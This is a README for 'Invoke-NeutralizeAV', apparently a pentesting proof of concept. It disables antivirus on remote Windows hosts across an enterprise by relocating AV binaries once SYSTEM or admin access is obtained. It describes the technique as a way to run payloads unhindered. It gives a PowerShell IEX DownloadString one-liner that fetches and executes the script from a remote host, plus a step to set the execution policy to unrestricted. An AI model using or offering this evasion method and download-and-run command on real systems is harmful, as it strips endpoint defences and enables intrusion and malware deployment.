# Invoke-NeutralizeAV
Quick PoC I Wrote for Bypassing Next Gen AV Remotely for Pentesting

# Description
I created this PoC based on a recent discovery of mine during a penetration test where I had SYSTEM access but could not stop AV processes or Services.  I found that simply moving the binaries on disk to another directory essentially neutralized the running AV process.  Use this script to effectively shut down AV across an enterprise environment so you can execute your payloads, etc.  There's also an "Enable" switch to set everything back when finished.

# Instructions
You'll probably want to read the blog first at https://curtbraz.blogspot.com/2018/08/bypassing-next-gen-av-during-pentest.html.  

The assumption is being made that you are first running as SYSTEM or at least a Local or Domain Admin that can elevate to SYSTEM on a Windows OS with PowerShell.  If AV is enabled on the target you plan to run this scipt on, it will likely need to be neutralized first before this can be leveraged to disable remote targets.  See the blog for details.  Soon, I'll provide a BAT file so it's not a manual process.

Paste the following into the elevated CMD prompt to download the PS1 script.  (Note: You may need to first enable scripts on the host with `Set-ExecutionPolicy unrestricted`)

1) `powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/curtbraz/Invoke-NeutralizeAV/master/Invoke-NeutralizeAV.ps1')`

2) Enjoy! :)

<p align="center"><img align="center" width="600" alt="Invoke-NeutralizeAV Screenshot" src="https://i.imgur.com/lAyw41i.png"></p>

# Closing Thoughts
This is a quick and dirty PoC.  I plan to fix it up and add more functionality soon (host list, CIDR notation, disabling services & other bypass methods first, quiet mode, etc), but hopefully in the meantime this will assist people to more quickly bypass next gen AV on remote hosts during a pentest.  I can't disclose the one AV vendor I know this works against, but I'm hopeful it will work on others.  I would love it if you could report back on what does/doesn't work.  I wrote this script in a dynamic way so I didn't have to keep an ongoing list of current AV Service Names.
